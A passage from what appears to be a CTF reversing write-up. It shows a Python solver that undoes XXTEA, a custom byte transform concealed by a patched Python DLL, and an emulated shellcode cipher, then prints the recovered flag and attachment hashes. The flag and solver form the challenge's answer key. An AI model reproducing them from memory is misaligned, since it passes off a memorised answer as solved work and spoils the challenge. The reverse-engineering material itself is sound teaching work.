ROUND_DIV = 64


def _mx(y, z, total, e, p, k):
    a = (((z >> 3) ^ ((y << 2) & M32)) + ((y >> 5) ^ ((z << 4) & M32))) & M32
    b = ((total ^ y) + (k[(p & 3) ^ e] ^ z)) & M32
    return (a ^ b) & M32


def xxtea_encrypt(v, k):
    v = list(v)
    n = len(v)
    if n < 2:
        return v
    q = ROUND_BASE + ROUND_DIV // n
    total = 0
    z = v[n - 1]
    while q > 0:
        q -= 1
        total = (total + DELTA) & M32
        e = (total >> 2) & 3
        for p in range(n - 1):
            y = v[p + 1]
            v[p] = (v[p] + _mx(y, z, total, e, p, k)) & M32
            z = v[p]
        y = v[0]
        v[n - 1] = (v[n - 1] + _mx(y, z, total, e, n - 1, k)) & M32
        z = v[n - 1]
    return v


def xxtea_decrypt(v, k):
    v = list(v)
    n = len(v)
    if n < 2:
        return v
    q = ROUND_BASE + ROUND_DIV // n
    total = (q * DELTA) & M32
    y = v[0]
    while total != 0:
        e = (total >> 2) & 3
        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            v[p] = (v[p] - _mx(y, z, total, e, p, k)) & M32
            y = v[p]
        z = v[n - 1]
        v[0] = (v[0] - _mx(y, z, total, e, 0, k)) & M32
        y = v[0]
        total = (total - DELTA) & M32
    return v


def to_words(b):
    return list(struct.unpack("<%dI" % (len(b) // 4), b))


def to_bytes(v):
    return struct.pack("<%dI" % len(v), *v)


def exit_encrypt(x, key=A):
    return to_bytes(xxtea_encrypt(to_words(x), to_words(key)))


def exit_decrypt(y, key=A):
    return to_bytes(xxtea_decrypt(to_words(y), to_words(key)))


# --------------------------------------------------------------------------
# 3. algo._f and its inverse
#
#    The shipped python311.dll swaps some BINARY_OP slots; reading its .pyc with
#    the stock mapping inverts these six ops.  The real source is:
#
#        p, q, r, t, u, w = b"\x80.'\x17\x8e\r"
#        m, n, o, z       = b' 3(^'
#        if (w | 1) & 1:                      # always true
#            b = list(bytes(s))
#            for i in range(len(b) - 1): b[i + 1] ^= b[i]
#            b = [<listcomp> for x in b]
#            for i in range(len(b) - 2, -1, -1): b[i] ^= b[i + 1]
#            return bytes(b)
#        return bytes(<genexpr> for x in s)
#
#    with  byte_map(x) = rol8(((x*167) & 255) ^ 60, 3) ^ 94
# --------------------------------------------------------------------------
MUL, X1, SHL, SHR, X2 = 167, 60, 3, 5, 94        # p+39, q+14, r-36, t^18, u-48
INV_MUL = 23                                     # 167 * 23 == 1 (mod 256)


def byte_map(x):
    mid = ((x * MUL) & 255) ^ X1
    return (((mid << SHL) | (mid >> SHR)) & 255) ^ X2


def byte_unmap(y):
    mid = ((((y ^ X2) >> SHL) | ((y ^ X2) << SHR)) & 255)
    return ((mid ^ X1) * INV_MUL) & 255


def f(s):
    b = list(bytes(s))
    for i in range(len(b) - 1):
        b[i + 1] ^= b[i]
    b = [byte_map(x) for x in b]
    for i in range(len(b) - 2, -1, -1):
        b[i] ^= b[i + 1]
    return bytes(b)


def f_inv(y):
    y = list(bytes(y))
    n = len(y)
    m = [0] * n
    m[n - 1] = y[n - 1]
    for i in range(n - 2, -1, -1):
        m[i] = y[i] ^ y[i + 1]
    m = [byte_unmap(v) for v in m]
    c = [0] * n
    c[0] = m[0]
    for i in range(1, n):
        c[i] = m[i] ^ m[i - 1]
    return bytes(c)


# --------------------------------------------------------------------------
# 4. shellcode disassembly (engine.exec's K, 1514 bytes, 467 instructions)
#    dumped linearly with IDA as 64-bit code at base 0x20000000
# --------------------------------------------------------------------------
ASM = r"""0000  test    edx, edx
0002  jz      near ptr unk_200005E9
0008  push    r12
000a  push    r14
000c  sub     rsp, 18h
0010  mov     [rsp+30h], rbx
0015  mov     r12, r8
0018  mov     [rsp+38h], rbp
001d  mov     r14, rcx
0020  mov     [rsp+40h], rsi
0025  mov     [rsp+10h], rdi
002a  mov     [rsp+8], r13
002f  mov     [rsp], r15
0033  mov     r15d, edx
0036  nop     word ptr [rax+rax+00000000h]
0040  mov     esi, [r14]
0043  xor     ebp, ebp
0045  mov     eax, [r14+4]
0049  lea     r13d, [rbp+2]
004d  nop     dword ptr [rax]
0050  mov     edx, eax
0052  lea     edi, [rbp+2Ah]
0055  shr     edx, 3
0058  mov     ecx, ebp
005a  and     ecx, 3
005d  mov     ebx, [r12+rcx*4]
0061  mov     ecx, eax
0063  shl     ecx, 6
0066  add     ebx, ebp
0068  xor     edx, ecx
006a  add     edx, eax
006c  xor     edx, ebx
006e  add     esi, edx
0070  mov     ecx, esi
0072  mov     r8d, esi
0075  shl     ecx, 6
0078  shr     r8d, 3
007c  xor     r8d, ecx
007f  lea     ecx, [rbp-3EBh]
0085  shr     rcx, 9
0089  add     r8d, esi
008c  and     ecx, 3
008f  mov     edx, [r12+rcx*4]
0093  add     edx, 7F4A7C15h
0099  add     edx, ebp
009b  xor     r8d, edx
009e  lea     edx, [rbp+29h]
00a1  and     edx, 3
00a4  add     eax, r8d
00a7  mov     ecx, eax
00a9  shl     ecx, 6
00ac  mov     r11d, [r12+rdx*4]
00b0  mov     edx, eax
00b2  shr     edx, 3
00b5  add     r11d, ebp
00b8  xor     edx, ecx
00ba  add     edx, eax
00bc  lea     ecx, [r11+7F4A7C15h]
00c3  xor     edx, ecx
00c5  add     esi, edx
00c7  mov     ecx, esi
00c9  mov     r8d, esi
00cc  shl     ecx, 6
00cf  shr     r8d, 3
00d3  xor     r8d, ecx
00d6  mov     ecx, edi
00d8  shr     rcx, 9
00dc  add     r8d, esi
00df  and     ecx, 3
00e2  mov     edx, [r12+rcx*4]
00e6  lea     ecx, [rbp-2]
00e9  add     edx, 0FE94F82Ah
00ef  and     ecx, 3
00f2  add     edx, ebp
00f4  xor     r8d, edx
00f7  add     eax, r8d
00fa  mov     r10d, [r12+rcx*4]
00fe  mov     edx, eax
0100  shr     edx, 3
0103  mov     ecx, eax
0105  shl     ecx, 6
0108  add     r10d, ebp
010b  xor     edx, ecx
010d  add     edx, eax
010f  lea     ecx, [r10-16B07D6h]
0116  xor     edx, ecx
0118  add     esi, edx
011a  mov     ecx, esi
011c  mov     r8d, esi
011f  shl     ecx, 6
0122  shr     r8d, 3
0126  xor     r8d, ecx
0129  lea     ecx, [rbp-3C1h]
012f  shr     rcx, 9
0133  add     r8d, esi
0136  and     ecx, 3
0139  mov     edx, [r12+rcx*4]
013d  add     edx, 7DDF743Fh
0143  add     edx, ebp
0145  xor     r8d, edx
0148  add     eax, r8d
014b  mov     edx, eax
014d  lea     ecx, [rbp-1]
0150  and     ecx, 3
0153  shr     edx, 3
0156  mov     r9d, [r12+rcx*4]
015a  mov     ecx, eax
015c  shl     ecx, 6
015f  add     r9d, ebp
0162  xor     edx, ecx
0164  add     edx, eax
0166  lea     ecx, [r9+7DDF743Fh]
016d  xor     edx, ecx
016f  add     esi, edx
0171  mov     ecx, esi
0173  mov     r8d, esi
0176  shl     ecx, 6
0179  shr     r8d, 3
017d  xor     r8d, ecx
0180  lea     ecx, [rdi+2Ah]
0183  shr     rcx, 9
0187  add     r8d, esi
018a  and     ecx, 3
018d  mov     edx, [r12+rcx*4]
0191  add     edx, 0FD29F054h
0197  add     edx, ebp
0199  xor     r8d, edx
019c  add     eax, r8d
019f  mov     ecx, eax
01a1  mov     edx, eax
01a3  shr     edx, 3
01a6  shl     ecx, 6
01a9  xor     edx, ecx
01ab  lea     ecx, [rbx-2D60FACh]
01b1  add     edx, eax
01b3  xor     edx, ecx
01b5  add     esi, edx
01b7  mov     ecx, esi
01b9  mov     r8d, esi
01bc  shl     ecx, 6
01bf  shr     r8d, 3
01c3  xor     r8d, ecx
01c6  lea     ecx, [rbp-397h]
01cc  shr     rcx, 9
01d0  add     r8d, esi
01d3  and     ecx, 3
01d6  mov     edx, [r12+rcx*4]
01da  add     edx, 7C746C69h
01e0  add     edx, ebp
01e2  xor     r8d, edx
01e5  add     eax, r8d
01e8  mov     ecx, eax
01ea  mov     edx, eax
01ec  shr     edx, 3
01ef  shl     ecx, 6
01f2  xor     edx, ecx
01f4  lea     ecx, [r11+7C746C69h]
01fb  add     edx, eax
01fd  xor     edx, ecx
01ff  add     esi, edx
0201  mov     ecx, esi
0203  mov     r8d, esi
0206  shl     ecx, 6
0209  shr     r8d, 3
020d  xor     r8d, ecx
0210  lea     ecx, [rdi+54h]
0213  shr     rcx, 9
0217  add     r8d, esi
021a  and     ecx, 3
021d  mov     edx, [r12+rcx*4]
0221  add     edx, 0FBBEE87Eh
0227  add     edx, ebp
0229  xor     r8d, edx
022c  add     eax, r8d
022f  mov     edx, eax
0231  mov     ecx, eax
0233  shr     edx, 3
0236  shl     ecx, 6
0239  xor     edx, ecx
023b  lea     ecx, [r10-4411782h]
0242  add     edx, eax
0244  xor     edx, ecx
0246  add     esi, edx
0248  mov     ecx, esi
024a  mov     r8d, esi
024d  shl     ecx, 6
0250  shr     r8d, 3
0254  xor     r8d, ecx
0257  lea     ecx, [rbp-36Dh]
025d  shr     rcx, 9
0261  add     r8d, esi
0264  and     ecx, 3
0267  mov     edx, [r12+rcx*4]
026b  add     edx, 7B096493h
0271  add     edx, ebp
0273  xor     r8d, edx
0276  add     eax, r8d
0279  mov     ecx, eax
027b  mov     edx, eax
027d  shl     ecx, 6
0280  shr     edx, 3
0283  xor     edx, ecx
0285  lea     ecx, [r9+7B096493h]
028c  add     edx, eax
028e  xor     edx, ecx
0290  add     esi, edx
0292  mov     ecx, esi
0294  mov     r8d, esi
0297  shl     ecx, 6
029a  shr     r8d, 3
029e  xor     r8d, ecx
02a1  lea     ecx, [rdi+7Eh]
02a4  shr     rcx, 9
02a8  add     r8d, esi
02ab  and     ecx, 3
02ae  mov     edx, [r12+rcx*4]
02b2  add     edx, 0FA53E0A8h
02b8  add     edx, ebp
02ba  xor     r8d, edx
02bd  add     eax, r8d
02c0  mov     ecx, eax
02c2  mov     edx, eax
02c4  shl     ecx, 6
02c7  shr     edx, 3
02ca  xor     edx, ecx
02cc  lea     ecx, [rbx-5AC1F58h]
02d2  add     edx, eax
02d4  xor     edx, ecx
02d6  add     esi, edx
02d8  mov     ecx, esi
02da  mov     r8d, esi
02dd  shl     ecx, 6
02e0  shr     r8d, 3
02e4  xor     r8d, ecx
02e7  lea     ecx, [rbp-343h]
02ed  shr     rcx, 9
02f1  add     r8d, esi
02f4  and     ecx, 3
02f7  mov     edx, [r12+rcx*4]
02fb  add     edx, 799E5CBDh
0301  add     edx, ebp
0303  xor     r8d, edx
0306  add     eax, r8d
0309  mov     ecx, eax
030b  mov     edx, eax
030d  shl     ecx, 6
0310  shr     edx, 3
0313  xor     edx, ecx
0315  lea     ecx, [r11+799E5CBDh]
031c  add     edx, eax
031e  xor     edx, ecx
0320  add     esi, edx
0322  mov     ecx, esi
0324  mov     r8d, esi
0327  shl     ecx, 6
032a  shr     r8d, 3
032e  xor     r8d, ecx
0331  lea     ecx, [rdi+0A8h]
0337  shr     rcx, 9
033b  add     r8d, esi
033e  and     ecx, 3
0341  mov     edx, [r12+rcx*4]
0345  add     edx, 0F8E8D8D2h
034b  add     edx, ebp
034d  xor     r8d, edx
0350  add     eax, r8d
0353  mov     ecx, eax
0355  mov     edx, eax
0357  shr     edx, 3
035a  shl     ecx, 6
035d  xor     edx, ecx
035f  lea     ecx, [r10-717272Eh]
0366  add     edx, eax
0368  xor     edx, ecx
036a  add     esi, edx
036c  mov     ecx, esi
036e  mov     r8d, esi
0371  shl     ecx, 6
0374  shr     r8d, 3
0378  xor     r8d, ecx
037b  lea     ecx, [rbp-319h]
0381  shr     rcx, 9
0385  add     r8d, esi
0388  and     ecx, 3
038b  mov     edx, [r12+rcx*4]
038f  add     edx, 783354E7h
0395  add     edx, ebp
0397  xor     r8d, edx
039a  add     eax, r8d
039d  mov     ecx, eax
039f  mov     edx, eax
03a1  shr     edx, 3
03a4  shl     ecx, 6
03a7  xor     edx, ecx
03a9  lea     ecx, [r9+783354E7h]
03b0  add     edx, eax
03b2  xor     edx, ecx
03b4  add     esi, edx
03b6  mov     ecx, esi
03b8  mov     r8d, esi
03bb  shl     ecx, 6
03be  shr     r8d, 3
03c2  xor     r8d, ecx
03c5  lea     ecx, [rdi+0D2h]
03cb  shr     rcx, 9
03cf  add     r8d, esi
03d2  and     ecx, 3
03d5  mov     edx, [r12+rcx*4]
03d9  add     edx, 0F77DD0FCh
03df  add     edx, ebp
03e1  xor     r8d, edx
03e4  add     eax, r8d
03e7  mov     ecx, eax
03e9  mov     edx, eax
03eb  shr     edx, 3
03ee  shl     ecx, 6
03f1  xor     edx, ecx
03f3  lea     ecx, [rbx-8822F04h]
03f9  add     edx, eax
03fb  xor     edx, ecx
03fd  add     esi, edx
03ff  mov     ecx, esi
0401  mov     r8d, esi
0404  shl     ecx, 6
0407  shr     r8d, 3
040b  xor     r8d, ecx
040e  lea     ecx, [rbp-2EFh]
0414  shr     rcx, 9
0418  add     r8d, esi
041b  and     ecx, 3
041e  mov     edx, [r12+rcx*4]
0422  add     edx, 76C84D11h
0428  add     edx, ebp
042a  xor     r8d, edx
042d  add     eax, r8d
0430  mov     edx, eax
0432  mov     ecx, eax
0434  shr     edx, 3
0437  shl     ecx, 6
043a  xor     edx, ecx
043c  lea     ecx, [r11+76C84D11h]
0443  add     edx, eax
0445  xor     edx, ecx
0447  add     esi, edx
0449  mov     ecx, esi
044b  mov     r8d, esi
044e  shl     ecx, 6
0451  shr     r8d, 3
0455  xor     r8d, ecx
0458  lea     ecx, [rdi+0FCh]
045e  shr     rcx, 9
0462  add     r8d, esi
0465  and     ecx, 3
0468  mov     edx, [r12+rcx*4]
046c  add     edx, 0F612C926h
0472  add     edx, ebp
0474  xor     r8d, edx
0477  add     eax, r8d
047a  mov     ecx, eax
047c  mov     edx, eax
047e  shl     ecx, 6
0481  shr     edx, 3
0484  xor     edx, ecx
0486  lea     ecx, [r10-9ED36DAh]
048d  add     edx, eax
048f  xor     edx, ecx
0491  add     esi, edx
0493  mov     ecx, esi
0495  mov     r8d, esi
0498  shl     ecx, 6
049b  shr     r8d, 3
049f  xor     r8d, ecx
04a2  lea     ecx, [rbp-2C5h]
04a8  shr     rcx, 9
04ac  add     r8d, esi
04af  and     ecx, 3
04b2  mov     edx, [r12+rcx*4]
04b6  add     edx, 755D453Bh
04bc  add     edx, ebp
04be  xor     r8d, edx
04c1  add     eax, r8d
04c4  mov     ecx, eax
04c6  mov     edx, eax
04c8  shl     ecx, 6
04cb  shr     edx, 3
04ce  xor     edx, ecx
04d0  lea     ecx, [r9+755D453Bh]
04d7  add     edx, eax
04d9  xor     edx, ecx
04db  add     esi, edx
04dd  mov     ecx, esi
04df  mov     r8d, esi
04e2  shl     ecx, 6
04e5  shr     r8d, 3
04e9  xor     r8d, ecx
04ec  lea     ecx, [rdi+126h]
04f2  shr     rcx, 9
04f6  add     r8d, esi
04f9  and     ecx, 3
04fc  mov     edx, [r12+rcx*4]
0500  add     edx, 0F4A7C150h
0506  add     edx, ebp
0508  xor     r8d, edx
050b  add     eax, r8d
050e  mov     ecx, eax
0510  mov     edx, eax
0512  shl     ecx, 6
0515  shr     edx, 3
0518  xor     edx, ecx
051a  lea     ecx, [rbx-0B583EB0h]
0520  add     edx, eax
0522  xor     edx, ecx
0524  add     esi, edx
0526  mov     ecx, esi
0528  mov     r8d, esi
052b  shl     ecx, 6
052e  shr     r8d, 3
0532  xor     r8d, ecx
0535  lea     ecx, [rbp-29Bh]
053b  shr     rcx, 9
053f  add     r8d, esi
0542  and     ecx, 3
0545  mov     edx, [r12+rcx*4]
0549  add     edx, 73F23D65h
054f  add     edx, ebp
0551  xor     r8d, edx
0554  add     eax, r8d
0557  mov     ecx, eax
0559  mov     edx, eax
055b  shl     ecx, 6
055e  shr     edx, 3
0561  xor     edx, ecx
0563  lea     ecx, [r11+73F23D65h]
056a  add     edx, eax
056c  xor     edx, ecx
056e  add     esi, edx
0570  lea     edx, [rbp-0CC34686h]
0576  mov     ecx, esi
0578  mov     r8d, esi
057b  shl     ecx, 6
057e  add     ebp, 0F33CB97Ah
0584  shr     r8d, 3
0588  xor     r8d, ecx
058b  lea     ecx, [rdi+150h]
0591  shr     rcx, 9
0595  add     r8d, esi
0598  and     ecx, 3
059b  add     edx, [r12+rcx*4]
059f  xor     r8d, edx
05a2  add     eax, r8d
05a5  sub     r13, 1
05a9  jnz     loc_20000050
05af  mov     [r14], esi
05b2  mov     [r14+4], eax
05b6  add     r14, 8
05ba  sub     r15, 1
05be  jnz     loc_20000040
05c4  mov     r15, [rsp]
05c8  mov     r13, [rsp+8]
05cd  mov     rdi, [rsp+10h]
05d2  mov     rsi, [rsp+40h]
05d7  mov     rbp, [rsp+38h]
05dc  mov     rbx, [rsp+30h]
05e1  add     rsp, 18h
05e5  pop     r14
05e7  pop     r12
05e9  retn"""


# --------------------------------------------------------------------------
# 5. minimal x86-64 interpreter for exactly the instruction forms above
# --------------------------------------------------------------------------
R64 = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "rsp",
       "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
R32 = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp",
       "r8d", "r9d", "r10d", "r11d", "r12d", "r13d", "r14d", "r15d"]
R32_TO_R64 = dict(zip(R32, R64))


class Insn:
    __slots__ = ("off", "mn", "ops", "text")

    def __init__(self, off, mn, ops, text):
        self.off, self.mn, self.ops, self.text = off, mn, ops, text

    def __repr__(self):
        return "<%04x %s>" % (self.off, self.text)


def split_ops(s):
    out, depth, cur = [], 0, ""
    for ch in s:
        if ch == "[":
            depth += 1
        elif ch == "]":
            depth -= 1
        if ch == "," and depth == 0:
            out.append(cur.strip())
            cur = ""
        else:
            cur += ch
    if cur.strip():
        out.append(cur.strip())
    return out


def load(text):
    prog = []
    for line in text.splitlines():
        if not line.strip():
            continue
        m = re.match(r"^([0-9a-f]{4})\s\s(.*)$", line)
        if not m:
            raise ValueError("bad line: " + line)
        off = int(m.group(1), 16)
        body = m.group(2).strip()
        mn, _, rest = body.partition(" ")
        prog.append(Insn(off, mn, split_ops(rest.strip()) if rest.strip() else [], body))
    return prog


ADDR_RE = re.compile(r"^([A-Za-z0-9]+)(?:\s*([+-])\s*(.+))?$")


def parse_mem(expr):
    """(base, index, scale, disp) for an [...] operand."""
    assert expr.startswith("[") and expr.endswith("]"), expr
    inner = expr[1:-1]
    base = index = None
    scale = 1
    disp = 0
    for sign, tok in re.findall(r"([+-]?)([^+-]+)", inner):
        tok = tok.strip()
        if "*" in tok:
            reg, sc = tok.split("*")
            index, scale = reg.strip(), int(sc.strip(), 0)
            if sign == "-":
                scale = -scale
        elif tok in R64 or tok in R32:
            if base is None:
                base = tok
            else:
                index, scale = tok, 1
        else:
            v = int(tok.rstrip("h"), 16) if tok.endswith("h") else int(tok, 0)
            disp += -v if sign == "-" else v
    return base, index, scale, disp


class Machine:
    DATA = 0x30000000
    KEY = 0x30001000
    STACK = 0x30002000

    def __init__(self, prog):
        self.prog = prog
        self.by_off = {i.off: n for n, i in enumerate(prog)}
        self.mem = {}
        self.R = {r: 0 for r in R64}
        self.R["rsp"] = self.STACK + 0x1000
        self.eflags_zf = False
        self.trace = []

    def rd(self, addr, size):
        v = 0
        for i in range(size):
            v |= self.mem.get(addr + i, 0) << (8 * i)
        return v

    def wr(self, addr, size, val):
        for i in range(size):
            self.mem[addr + i] = (val >> (8 * i)) & 0xFF

    def get(self, name):
        return self.R[R32_TO_R64.get(name, name)]

    def set(self, name, val):
        if name in R32_TO_R64:
            self.R[R32_TO_R64[name]] = val & 0xFFFFFFFF
        else:
            self.R[name] = val & 0xFFFFFFFFFFFFFFFF

    def run(self, max_steps=200000):
        pc = 0
        steps = 0
        while steps < max_steps:
            steps += 1
            n = self.by_off.get(pc)
            if n is None:
                raise RuntimeError("pc %#x not at an instruction boundary" % pc)
            ins = self.prog[n]
            self.trace.append(n)
            nn = self.step(ins)
            if nn is None:
                return steps
            pc = nn
        raise RuntimeError("step limit")

    def step(self, ins):
        mn, ops = ins.mn, ins.ops
        if mn == "nop":
            return self.next_off(ins)
        if mn == "retn":
            return None
        if mn == "push":
            sp = self.R["rsp"] - 8
            self.R["rsp"] = sp
            self.wr(sp, 8, self.get(ops[0]))
            return self.next_off(ins)
        if mn == "pop":
            sp = self.R["rsp"]
            self.set(ops[0], self.rd(sp, 8))
            self.R["rsp"] = sp + 8
            return self.next_off(ins)
        if mn in ("jz", "jnz"):
            target = int(re.search(r"_([0-9A-Fa-f]+)$",
                                   ops[0].replace("ptr ", "")).group(1), 16) - 0x20000000
            take = self.eflags_zf if mn == "jz" else (not self.eflags_zf)
            return target if take else self.next_off(ins)
        if mn == "test":
            self.eflags_zf = (self.get(ops[0]) & self.get(ops[1])) == 0
            return self.next_off(ins)
        if mn == "mov":
            d, s = ops
            if d.startswith("["):
                size = 8 if (s in R64) else 4
                base, index, scale, disp = parse_mem(d)
                addr = self.get(base) + (self.get(index) * scale if index else 0) + disp
                self.wr(addr, size, self.get(s))
            elif s.startswith("["):
                size = 8 if (d in R64) else 4
                base, index, scale, disp = parse_mem(s)
                addr = self.get(base) + (self.get(index) * scale if index else 0) + disp
                self.set(d, self.rd(addr, size))
            else:
                self.set(d, self.get(s))
            return self.next_off(ins)
        if mn == "lea":
            d, s = ops
            base, index, scale, disp = parse_mem(s)
            addr = (self.get(base) if base else 0) + (self.get(index) * scale if index else 0) + disp
            self.set(d, addr & 0xFFFFFFFF)
            return self.next_off(ins)
        if mn in ("add", "sub", "xor", "and", "or"):
            d, s = ops
            if s.startswith("["):
                base, index, scale, disp = parse_mem(s)
                sval = self.rd(self.get(base) + (self.get(index) * scale if index else 0) + disp, 4)
            elif s in R64 or s in R32:
                sval = self.get(s)
            else:
                sval = int(s.rstrip("h"), 16) if s.endswith("h") else int(s, 0)
            a = self.get(d)
            if mn == "add":
                self.set(d, a + sval)
            elif mn == "sub":
                self.set(d, a - sval)
            elif mn == "xor":
                self.set(d, a ^ sval)
            elif mn == "and":
                self.set(d, a & sval)
            else:
                self.set(d, a | sval)
            self.eflags_zf = self.get(d) == 0
            return self.next_off(ins)
        if mn in ("shl", "shr"):
            d, s = ops
            n = int(s.rstrip("h"), 16) if s.endswith("h") else int(s, 0)
            a = self.get(d)
            self.set(d, (a << n) if mn == "shl" else (a >> n))
            return self.next_off(ins)
        raise NotImplementedError(ins.text)

    def next_off(self, ins):
        idx = self.prog.index(ins)
        return self.prog[idx + 1].off if idx + 1 < len(self.prog) else None


def cipher_block(inp8, key16, prog):
    """The shellcode's per-block transform: (RCX) = data in/out, (R8) = key, EDX = 8."""
    m = Machine(prog)
    m.wr(Machine.DATA, 8, int.from_bytes(inp8, "little"))
    for i in range(0, 16, 4):
        m.wr(Machine.KEY + i, 4, int.from_bytes(key16[i:i + 4], "little"))
    m.R["rcx"], m.R["r8"], m.R["rdx"] = Machine.DATA, Machine.KEY, 8
    m.run()
    return m.rd(Machine.DATA, 8).to_bytes(8, "little"), m


# --------------------------------------------------------------------------
# 6. inverting the shellcode cipher
#
#    Inside one 8-byte block the live state is only (esi, eax, ebp); every other
#    register is a temporary recomputed within the current step.  So we record
#    the executed instruction trace and walk it backwards: for each instruction
#    that updates a state register we recompute its addend (replaying the
#    defining instructions, following cross-step temporaries such as
#    rdi = ebp + 0x2A) and then subtract it back out.
#
#    Two traps:
#      * read-modify-write instructions (add/shl/...) read their destination too,
#        so dependency resolution has to walk to the previous definition;
#      * `add ebp, 0xF33CB97A` sits in the middle of the last round of each loop
#        iteration, so it is undone first - that restores the sum the rounds of
#        that iteration actually used.
# --------------------------------------------------------------------------
DATA_OFF = 0x40       # mov esi, [r14]
END_OFF = 0x5B2       # mov [r14+4], eax
BODY_OFF = 0x50
WORD_STATE = ("rsi", "rax")
STATE = ("rsi", "rax", "rbp")
WRITERS = ("mov", "lea", "add", "sub", "xor", "and", "or", "shl", "shr")
IGNORED = {"r12", "r13", "r14", "r15", "rsp"}


def canon(r):
    return R32_TO_R64.get(r, r)


def _regs_in_operand(op):
    out = []
    if op.startswith("["):
        base, index, _, _ = parse_mem(op)
        if base:
            out.append(canon(base))
        if index:
            out.append(canon(index))
    elif op in R64 or op in R32:
        out.append(canon(op))
    return out


def reads(ins):
    """Only mov/lea overwrite their destination; the arithmetic forms read it."""
    out = []
    for i, op in enumerate(ins.ops):
        if i == 0 and ins.mn in ("mov", "lea") and not op.startswith("["):
            continue
        out.extend(_regs_in_operand(op))
    return out


def writes(ins):
    if ins.mn in WRITERS and ins.ops and not ins.ops[0].startswith("["):
        return [canon(ins.ops[0])]
    return []


def operand_value(m, op):
    if op.startswith("["):
        base, index, scale, disp = parse_mem(op)
        addr = (m.get(base) if base else 0) + (m.get(index) * scale if index else 0) + disp
        return m.rd(addr, 4)
    if op in R64 or op in R32:
        return m.get(op) & 0xFFFFFFFF
    return int(op.rstrip("h"), 16) if op.endswith("h") else int(op, 0)


class Inverter:
    def __init__(self, key16, prog):
        self.prog = prog
        self.key = key16
        P = prog
        m = Machine(P)
        m.wr(Machine.DATA, 8, 0)
        for i in range(0, 16, 4):
            m.wr(Machine.KEY + i, 4, 0)
        m.R["rcx"], m.R["r8"], m.R["rdx"] = Machine.DATA, Machine.KEY, 8
        m.run()
        tr = m.trace
        s0 = next(i for i, n in enumerate(tr) if P[n].off == DATA_OFF)
        e0 = next(i for i, n in enumerate(tr) if P[n].off == END_OFF)
        self.t = tr[s0:e0 + 1]
        T = self.t
        starts = [i for i in range(len(T)) if P[T[i]].off == BODY_OFF]
        self.bodies = []
        for k, st in enumerate(starts):
            en = starts[k + 1] - 1 if k + 1 < len(starts) else len(T) - 1
            self.bodies.append((st, en))
        self.sum_marks = [i for i in range(len(T))
                          if writes(P[T[i]]) == ["rbp"] and P[T[i]].mn == "add"]
        self.final_sum = 0
        for i in self.sum_marks:
            self.final_sum = (self.final_sum
                              + operand_value(Machine(P), P[T[i]].ops[1])) & 0xFFFFFFFF
        self.plans = {}
        self.order = []
        wmarks_all = [i for i in range(len(T))
                      if writes(P[T[i]]) and writes(P[T[i]])[0] in WORD_STATE]
        for (st, en) in reversed(self.bodies):
            ws = [w for w in wmarks_all if st <= w <= en]
            prev = st - 1
            for w in ws:
                sl = [p for p in range(prev + 1, w) if p not in self.sum_marks]
                self.plans[w] = (self._defs(sl, prev + 1, st), sl)
                prev = w
            self.order.extend([w for w in self.sum_marks if st <= w <= en])
            self.order.extend(reversed(ws))

    def _defs(self, sl, sstart, body_start):
        need, written = [], set()
        for p in sl:
            for r in reads(self.prog[self.t[p]]):
                if r not in written and r not in STATE and r not in IGNORED:
                    need.append(r)
            written.update(writes(self.prog[self.t[p]]))
        plan = {}
        seen = set()

        def resolve(reg, before):
            if reg in STATE or reg in IGNORED or (reg, before) in seen:
                return
            seen.add((reg, before))
            for p in range(before - 1, body_start - 1, -1):
                ins = self.prog[self.t[p]]
                if reg in writes(ins):
                    plan[p] = ins
                    for r2 in reads(ins):
                        resolve(r2, p)
                    return

        for r in need:
            resolve(r, sstart)
        return sorted(plan)

    def _machine(self):
        m = Machine(self.prog)
        for i in range(0, 16, 4):
            m.wr(Machine.KEY + i, 4, int.from_bytes(self.key[i:i + 4], "little"))
        m.R["r12"] = Machine.KEY
        m.R["r14"] = Machine.DATA
        m.R["rsp"] = Machine.STACK + 0x1000
        m.set("ebp", self.final_sum)
        return m

    def decrypt(self, target8):
        m = self._machine()
        m.set("esi", int.from_bytes(target8[:4], "little"))
        m.set("eax", int.from_bytes(target8[4:], "little"))
        for wpos in self.order:
            ins = self.prog[self.t[wpos]]
            if wpos in self.sum_marks:
                m.set("ebp", (m.get("ebp") - operand_value(m, ins.ops[1])) & 0xFFFFFFFF)
                continue
            replay, sl = self.plans[wpos]
            for p in replay:
                m.step(self.prog[self.t[p]])
            for p in sl:
                m.step(self.prog[self.t[p]])
            dst = canon(ins.ops[0])
            add = operand_value(m, ins.ops[1])
            if ins.mn == "add":
                m.set(dst, (m.get(dst) - add) & 0xFFFFFFFF)
            elif ins.mn == "sub":
                m.set(dst, (m.get(dst) + add) & 0xFFFFFFFF)
            else:
                raise NotImplementedError(ins.text)
        return ((m.get("esi") & 0xFFFFFFFF).to_bytes(4, "little")
                + (m.get("eax") & 0xFFFFFFFF).to_bytes(4, "little"))


# --------------------------------------------------------------------------
# 7. solve
# --------------------------------------------------------------------------
def exec_K(data, prog, key=C):
    return b"".join(cipher_block(data[i:i + 8], key, prog)[0]
                    for i in range(0, len(data), 8))


def solve():
    prog = load(ASM)
    x_star = exit_decrypt(B)
    z = f_inv(x_star)
    inv = Inverter(C, prog)
    flag = b"".join(inv.decrypt(z[i:i + 8]) for i in range(0, 32, 8))
    return prog, x_star, z, flag


if __name__ == "__main__":
    prog, x_star, z, flag = solve()
    print("x* = XXTEA_A^-1(B) =", x_star.hex())
    print("z  = _f^-1(x*)     =", z.hex())
    print("flag               =", flag.decode("latin-1"))
```

输出：

```
x* = XXTEA_A^-1(B) = be770ea58310e7478507a455789cea4517c1ddbd6527ee9f8a1d73c0efb38065
z  = _f^-1(x*)     = 82eac63b663caadcb8c4ca51c38231d5f067e1b91dabfddcd045a109ba23ba90
flag               = TSCTF-J{Pyth0n_R3v3rse_Exp3rt!!}
```

---

## 附：附件哈希

| 文件 | 大小 | sha256 |
|---|---|---|
| `onelinereverse.exe` | 11,872,141 | `5C5589EC61D4105BD2C4E51A64FBB373F117C527A1E20B64CE213D87DD34FDCB` |
| `onelinereverse.exe_extracted/python311.dll` | 6,183,424 | `DB6F0347C91EAB21FC1972A3F7FB54AA149EA5E37A212AC6C8042D0A65D8C0C3` |
| `onelinereverse.exe_extracted/engine.pyd` | 83,456 | `1B356477CCF316B2BDF31CC7245D219E1B784832242155465230E06426E0AEB4` |
